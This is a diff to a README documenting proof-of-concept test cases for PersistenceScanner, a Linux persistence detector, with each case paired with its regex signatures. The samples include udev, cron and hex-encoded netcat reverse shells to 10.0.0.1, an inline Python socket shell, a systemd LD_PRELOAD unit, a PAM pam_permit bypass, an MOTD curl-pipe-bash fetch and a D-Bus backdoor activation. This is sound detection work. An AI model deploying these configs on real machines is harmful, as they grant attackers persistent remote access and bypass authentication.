@@ -1,22 +1,44 @@
 # PersistenceScanner - Proof of Concept (PoC)
 
-This document presents targeted Proof of Concept (PoC) test scenarios designed to validate **PersistenceScanner** against advanced evasion, obfuscation, and stealth persistence techniques. Every scenario maps directly to detection signatures in `rules.json`.
+> **⚠️ Safety & Testing Environment Disclaimer:** All Proof of Concept (PoC) artifacts and test payloads documented below were created and validated exclusively inside an **isolated Virtual Machine (VM)** environment. Do not deploy these configurations into active system directories (`/etc/udev/rules.d/`, `/etc/pam.d/`, `/etc/cron.d/`, etc.) on production or host machines.
+
+This document presents targeted Proof of Concept (PoC) test scenarios designed to validate **PersistenceScanner** against advanced evasion, obfuscation, and stealth persistence techniques. Every scenario maps directly to unique detection signatures in `rules.json`, organized by persistence vector.
 
 ---
 
-## PoC 1: Udev Macro Substitution Evasion
+## Table of Contents
+* [1. Udev Rules](#1-udev-rules)
+  * [PoC 1.1: Udev Macro Substitution Evasion & Process Tree Detachment](#poc-11-udev-macro-substitution-evasion--process-tree-detachment)
+  * [PoC 1.2: Udev Process Tree Detachment & Inline Python Reverse Shell](#poc-12-udev-process-tree-detachment--inline-python-reverse-shell)
+* [2. Systemd Services](#2-systemd-services)
+  * [PoC 2.1: Systemd Environment Injection & Encoded Evasion](#poc-21-systemd-environment-injection--encoded-evasion)
+* [3. Cron Jobs](#3-cron-jobs)
+  * [PoC 3.1: Cron String Reversal](#poc-31-cron-string-reversal)
+* [4. PAM Authentication](#4-pam-authentication)
+  * [PoC 4.1: PAM Authorization Bypass & Shared Memory Trigger](#poc-41-pam-authorization-bypass--shared-memory-trigger)
+* [5. MOTD & Shell Profile Scripts](#5-motd--shell-profile-scripts)
+  * [PoC 5.1: MOTD Dynamic Script Execution Persistence](#poc-51-motd-dynamic-script-execution-persistence)
+  * [PoC 5.2: Stealth Service Activation via Raw D-Bus Messaging](#poc-52-stealth-service-activation-via-raw-d-bus-messaging)
+  * [PoC 5.3: Hex-Encoded Payload & Anti-Forensics Defense Evasion](#poc-53-hex-encoded-payload--anti-forensics-defense-evasion)
 
-**Vector:** Attackers use Udev environment variables (`ENV{}`) and macro expansion (`$env{}`) combined with `eval` to hide reverse shell execution from simple string inspection.
+---
+
+## 1. Udev Rules
+
+### PoC 1.1: Udev Macro Substitution Evasion & Process Tree Detachment
+
+**Vector:** Attackers target a single deterministic boot-time device (`KERNEL=="rtc0"`, the hardware real-time clock initialized once per boot) and combine Udev environment variables (`ENV{}`) with macro expansion (`$env{}`) and `eval` to hide reverse shell execution from simple string inspection, piping the command into the `at` daemon to break parent-child process tree visibility and bypass the strict `systemd-udevd` execution timeout.
 
 **Simulated File:** `99-malicious.rules`
 
-```ini
-ACTION=="add", ENV{CMD}="nc -e /bin/bash 10.0.0.1 4444", RUN+="/bin/sh -c 'eval $env{CMD}'"
+```
+ACTION=="add", KERNEL=="rtc0", ENV{CMD}="nc -e /bin/bash 10.0.0.1 4444", RUN+="/bin/sh -c 'echo \"eval $env{CMD}\" | at now'"
 ```
 
 **Matched Indicators (`rules.json`):**
 * `\bnc\s+-e` — **CRITICAL** (*Reverse shell attempt using netcat with execution flag*)
-* `eval\\s+(\\$env|%E)\\{` — **MEDIUM** (*Udev macro substitution evasion attempt detected in extracted payload*)
+* `eval\s+(\$env|%E)\{` — **MEDIUM** (*Udev macro substitution evasion attempt detected in extracted payload*)
+* `\|\s*at\s+(now|[0-9:a-zA-Z+]+)` — **MEDIUM** (*Scheduling one-off tasks via 'at' daemon to break process tree visibility*)
 
 **PoC Evidence:**
 
@@ -24,13 +46,35 @@ ACTION=="add", ENV{CMD}="nc -e /bin/bash 10.0.0.1 4444", RUN+="/bin/sh -c 'eval 
 
 ---
 
-## PoC 2: Systemd Environment Injection & Encoded Evasion
+### PoC 1.2: Udev Process Tree Detachment & Inline Python Reverse Shell
+
+**Vector:** Because `systemd-udevd` enforces a strict execution timeout and terminates child processes within its cgroup once a rule finishes, attackers target a deterministic network interface initialization event (`SUBSYSTEM=="net", KERNEL=="eth0"`) and pipe a fileless inline Python reverse shell (`python3 -c`) into the `at` daemon (`echo ... | at now`) to decouple execution from the udev cgroup and persist once networking comes online.
+
+**Simulated File:** `99-network-sync.rules`
+
+```
+ACTION=="add", SUBSYSTEM=="net", KERNEL=="eth0", RUN+="/bin/sh -c 'echo \"python3 -c '\''import socket;s=socket.socket();s.connect((\\\"10.0.0.1\\\",4444))'\''\" | at now'"
+```
+
+**Matched Indicators (`rules.json`):**
+* `\b(python[23]?|perl|php|ruby|lua)\s+-(c|e|r)\s*["']?.*(socket|subprocess|eval|exec|system)` — **CRITICAL** (*Inline script execution using alternative system interpreters.*)
+* `\|\s*at\s+(now|[0-9:a-zA-Z+]+)` — **MEDIUM** (*Scheduling one-off tasks via 'at' daemon to break process tree visibility*)
+
+**PoC Evidence:**
+
+[![Udev Python Detection](assets/test-udev-at.png)](assets/test-udev-at.png)
+
+---
+
+## 2. Systemd Services
+
+### PoC 2.1: Systemd Environment Injection & Encoded Evasion
 
 **Vector:** Attackers utilize the `Environment=` directive to silently inject userland rootkit libraries (`LD_PRELOAD`) into the service context, completely separating the malicious injection from the seemingly benign Base64-encoded `ExecStart` command.
 
 **Simulated File:** `backdoor.service`
 
-```ini
+```
 [Unit]
 Description=System Security Monitor
 
@@ -45,12 +89,10 @@ WantedBy=multi-user.target
 ```
 
 **Matched Indicators (`rules.json`):**
-* `\|\s*(ba|z|k|da)?sh` — **LOW** (*Piping raw remote stream directly into shell execution*) - *Triggered via ExecStart field*
-* `base(64|32)\s+(-d|--decode)\s*\|\s*(ba|z|k|da)?sh` — **CRITICAL** (*Base64/32 decoding invocation piped directly into a shell interpreter.*) - *Triggered via ExecStart field*
-* `LD_PRELOAD` — **CRITICAL** (*Shared library preloading injection*) - *Triggered via Environment field*
-* `(/tmp|/dev/shm|/var/tmp|/run/user)/\.[a-zA-Z0-9_-]+` — **HIGH** (*Direct execution of hidden script or binary from non-standard temporary directories.*) - *Triggered via Environment field*
-
-
+* `\|\s*(ba|z|k|da)?sh` — **LOW** (*Piping raw remote stream directly into shell execution*) — *Triggered via ExecStart field*
+* `base(64|32)\s+(-d|--decode)\s*\|\s*(ba|z|k|da)?sh` — **CRITICAL** (*Base64/32 decoding invocation piped directly into a shell interpreter.*) — *Triggered via ExecStart field*
+* `LD_PRELOAD` — **CRITICAL** (*Shared library preloading injection*) — *Triggered via Environment field*
+* `(/tmp|/dev/shm|/var/tmp|/run/user(/[0-9]+)?)/\.[a-zA-Z0-9_-]+` — **HIGH** (*Direct execution of hidden script or binary from non-standard temporary directories.*) — *Triggered via Environment field*
 
 **PoC Evidence:**
 
@@ -58,20 +100,21 @@ WantedBy=multi-user.target
 
 ---
 
-## PoC 3: Cron String Reversal 
+## 3. Cron Jobs
 
-**Vector:** Attackers obfuscate payloads using string reversal (`rev | bash`)
+### PoC 3.1: Cron String Reversal
+
+**Vector:** Attackers obfuscate payloads using string reversal (`rev`) inside scheduled cron tasks to evade static signature matching.
 
 **Simulated File:** `root_cron`
 
-```cron
+```
 * * * * * root echo "4444 1.0.0.01 hsab/nib/ e- cn" | rev | bash
 ```
 
 **Matched Indicators (`rules.json`):**
-* `\|\s*(ba|z|k|da)?sh` — **LOW** (*Piping raw remote stream directly into shell execution*)
 * `rev\s*\|\s*(ba|z|k|da)?sh` — **CRITICAL** (*Reversed command string piped directly into a shell interpreter.*)
-
+* `\|\s*(ba|z|k|da)?sh` — **LOW** (*Piping raw remote stream directly into shell execution*)
 
 **PoC Evidence:**
 
@@ -79,13 +122,15 @@ WantedBy=multi-user.target
 
 ---
 
-## PoC 4: PAM Authorization Bypass & Shared Memory Trigger
+## 4. PAM Authentication
 
-**Vector:** Attackers force unconditional authentication bypass (`pam_permit.so`) while executing hidden payloads located in shared RAM disk space (`/dev/shm`) upon login events.
+### PoC 4.1: PAM Authorization Bypass & Shared Memory Trigger
+
+**Vector:** Attackers force unconditional authentication bypass (`pam_permit.so`) while executing payloads located in shared RAM disk space (`/dev/shm`) upon login events.
 
 **Simulated File:** `pam-test`
 
-```pam
+```
 #%PAM-1.0
 auth       sufficient   pam_permit.so
 session    optional     pam_exec.so /dev/shm/.harvest.sh
@@ -94,7 +139,7 @@ session    optional     pam_exec.so /dev/shm/.harvest.sh
 **Matched Indicators (`rules.json`):**
 * `auth\s+sufficient\s+pam_permit\.so` — **CRITICAL** (*PAM authentication bypass backdoor*)
 * `pam_exec\.so` — **HIGH** (*Execution of external commands during PAM authentication*)
-* `(/tmp|/dev/shm|/var/tmp|/run/user)/\.[a-zA-Z0-9_-]+` — **HIGH** (*Direct execution of hidden script or binary from non-standard temporary directories.*)
+* `(/tmp|/dev/shm|/var/tmp|/run/user(/[0-9]+)?)/\.[a-zA-Z0-9_-]+` — **HIGH** (*Direct execution of hidden script or binary from non-standard temporary directories.*)
 
 **PoC Evidence:**
 
@@ -102,22 +147,66 @@ session    optional     pam_exec.so /dev/shm/.harvest.sh
 
 ---
 
-## PoC 5: MOTD Dynamic Script Execution Persistence
+## 5. MOTD & Shell Profile Scripts
+
+### PoC 5.1: MOTD Dynamic Script Execution Persistence via curl
 
 **Vector:** Attackers place executable scripts into `/etc/update-motd.d/` that stealthily fetch and execute remote fileless payloads bypassing SSL verification and directly piping to the shell.
 
-**Simulated File:** `99-backdoor`
+**Simulated File:** `99-test-curl`
 
-```bash
+```
 #!/bin/sh
 curl -s -k https://10.0.0.1/update.sh | bash
 ```
 
 **Matched Indicators (`rules.json`):**
 * `\bcurl\s+.*\|\s*(ba|z|k|da)?sh` — **CRITICAL** (*Silent HTTP request via curl piped directly to a shell (Fileless payload execution)*)
-* `\bcurl\s+.*-(k|-insecure)` — **HIGH** (*HTTP request via curl with SSL/TLS verification disabled*)
+* `\bcurl\s+.*-(k|-insecure)` — **HIGH** (*HTTPS request via curl with SSL/TLS verification disabled*)
 * `\|\s*(ba|z|k|da)?sh` — **LOW** (*Piping raw remote stream directly into shell execution*)
 
 **PoC Evidence:**
 
 [![MOTD Detection](assets/test-motd.png)](assets/test-motd.png)
+
+---
+
+### PoC 5.2: Stealth Service Activation via Raw D-Bus Messaging
+
+**Vector:** To avoid triggering process monitoring alerts tied to standard service management binaries (such as `systemctl`), attackers place a dynamic MOTD script in `/etc/update-motd.d/` that sends raw D-Bus messages directly to `org.freedesktop.systemd1` to silently activate a dormant backdoor unit upon user login.
+
+**Simulated File:** `99-dbus-test`
+
+```
+#!/bin/sh
+dbus-send --system --dest=org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager.StartUnit string:backdoor.service string:replace
+```
+
+**Matched Indicators (`rules.json`):**
+* `(dbus-send|busctl)\s+.*org\.freedesktop\.systemd1` — **HIGH** (*D-Bus messaging used to secretly trigger systemd daemon actions*)
+
+**PoC Evidence:**
+
+[![D-Bus Systemd Detection](assets/test-dbus.png)](assets/test-dbus.png)
+
+---
+
+### PoC 5.3: Hex-Encoded Payload
+
+**Vector:** Attackers construct obfuscated shell commands using hexadecimal escape sequences via `printf`.
+
+**Simulated File:** `99-test`
+
+```
+#!/bin/bash
+printf '\x6e\x63\x20\x2d\x65\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x31\x30\x2e\x30\x2e\x30\x2e\x31\x20\x34\x34\x34\x34' | bash
+```
+
+**Matched Indicators (`rules.json`):**
+
+* `\|\s*(ba|z|k|da)?sh` — **LOW** (*Piping raw remote stream directly into shell execution*)
+* `printf\s+['"].*(\\x[0-9a-fA-F]{2}){3,}` — **HIGH** (*Hex-encoded string payload constructed via printf.*)
+
+**PoC Evidence:**
+
+[![Hex Detection](assets/test-printf.png)](assets/test-printf.png)
